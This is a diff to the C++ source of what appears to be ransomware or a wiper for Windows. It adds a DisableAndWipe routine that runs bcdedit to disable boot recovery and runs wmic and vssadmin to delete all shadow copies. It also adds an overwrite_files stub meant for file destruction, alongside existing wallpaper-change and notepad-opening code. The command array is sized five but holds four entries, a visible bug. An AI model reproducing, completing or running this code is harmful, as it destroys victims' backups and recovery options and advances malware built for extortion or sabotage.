@@ -49,6 +49,21 @@ private:
 
 		return false;
 	}
+	void DisableAndWipe() {
+		const char* commands[5] = { "cmd.exe /c bcdedit /set {default} recoveryenabled no", "cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", "cmd.exe /c wmic shadowcopy delete","cmd.exe /c vssadmin delete shadows /quiet /all" };
+
+		for (int i = 0; i < 5; i++) {
+			STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+			PROCESS_INFORMATION pi;
+
+			CreateProcessA(NULL, (LPSTR)commands[i], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+			WaitForSingleObject(pi.hProcess, INFINITE);
+
+			CloseHandle(pi.hProcess);
+			CloseHandle(pi.hThread);
+		}
+	}
 public:
 	Functionality() {
 		AllocConsole();
@@ -119,7 +134,7 @@ public:
 
 		const char* imagePathConst = imagePath.c_str();
 
-		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*) imagePathConst, SPIF_UPDATEINIFILE);
+		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)imagePathConst, SPIF_UPDATEINIFILE);
 	}
 	
 	void Desktop_Op() {
@@ -148,6 +163,14 @@ public:
 
 		ShellExecuteA(NULL, "open", "notepad.exe", FolderPathA.c_str(), NULL, SW_SHOWMAXIMIZED);
 	}
+	
+	void overwrite_files() {
+		get_main_drive();
+		DisableAndWipe();
+
+		/* Later gonna be added */
+
+	}
 };
 
 int main() {
@@ -175,7 +198,6 @@ int main() {
 	fork_thread.detach();
 
 	Obj.wallpaper_func();
-
 	while (1) {}
 
 
